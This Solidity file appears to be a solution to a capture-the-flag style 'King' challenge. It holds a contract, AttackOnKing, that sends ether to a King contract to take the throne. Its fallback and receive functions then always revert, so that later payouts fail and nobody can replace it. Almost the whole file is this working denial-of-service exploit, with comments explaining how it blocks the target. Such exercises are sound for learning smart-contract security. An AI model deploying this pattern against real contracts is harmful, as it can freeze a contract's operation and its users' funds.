// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./King.sol";

contract AttackOnKing {
    address payable KingAddress;
    uint256 public Price;
    constructor(address payable _KingAddress) payable {
        KingAddress = _KingAddress;
        Price = King(_KingAddress).prize();
        
    }
    function Attack() external payable {
        (bool success, ) = KingAddress.call{value : msg.value}("");
        require(success, "Failed");
    }

    // we are reverting this fallback and receive fn because after attack function this contract will be the new of King
    // conract if someone will again send the msg.value to King contract so receive function will again call but at line
    // no. 18 there is transfer fn use it will transfer the msg.value to this contract then fallback fn will call and It will
    // revert it

    // And we can comment It too because not having fallback or recieve It automatically revert the call

    fallback() external payable {
            revert();
    }

    receive() external payable {
        revert();
    }
}
